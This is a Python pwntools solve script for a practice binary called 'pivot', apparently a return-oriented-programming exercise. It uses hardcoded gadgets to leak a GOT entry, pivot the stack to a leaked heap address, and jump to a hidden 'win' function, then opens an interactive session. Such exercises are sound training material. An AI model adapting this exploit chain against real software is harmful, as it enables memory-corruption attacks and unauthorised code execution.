from pwn import *
import re
# import angr, angrop

l = process("./pivot")
# p = angr.Project("pivot")

# rop = p.analyses.ROP()
# rop.find_gadgets()

pop_rax = p64(0x00400b00) # pop rax; ret
pop_rdi = p64(0x00400b73) # pop rdi; ret

xchg_rax_rsp = p64(0x00400b02) # xchg rax, rsp; ret

mov_rax_rax = p64(0x00400b05) # mov rax, qword [rax]; ret

add_rax_rbp = p64(0x00400b09) # add rax, rbp; ret

foothold_function = p64(0x00400850) # Can't use directly because 0a triggers newline

main = p64(0x00400996)

printf = p64(0x00400810)
puts = p64(0x00400800)

foothold_got = p64(0x602048)

message1 = l.recvuntil("> ")
print message1
r = r'pivot: (.*)$'
heap_addr = p64(int(re.search(r, message1, re.MULTILINE).group(1), 16))

print "Found heap_addr: ", heap_addr

payload1 = foothold_function
payload1 += pop_rdi
payload1 += foothold_got
payload1 += puts
payload1 += main
payload1 += "B"*8

print "Sending payload1: ", payload1.encode("hex")
l.sendline(payload1)

print l.recvuntil("> ")

payload2 = "A" * 0x28
payload2 += pop_rax
payload2 += heap_addr
payload2 += xchg_rax_rsp

print "Sending payload2: ", payload2.encode("hex")
l.sendline(payload2)

print l.recvuntil(".so")

foothold_ptr = u64(l.recv(6) + "\x00\x00")
print "foothold_ptr = ", hex(foothold_ptr)

win_ptr = p64(foothold_ptr + 0x14e)

payload3 = "A" * 0x28
payload3 += win_ptr


print "GET READY WE ARE GOING IN AGAIN"

print l.recvuntil("> ")

print "sending payload3 once: ", payload3.encode("hex")
l.sendline(payload3)

print l.recvuntil("> ")

print "Sending payload3: ", payload3.encode("hex")
l.sendline(payload3)

l.interactive()
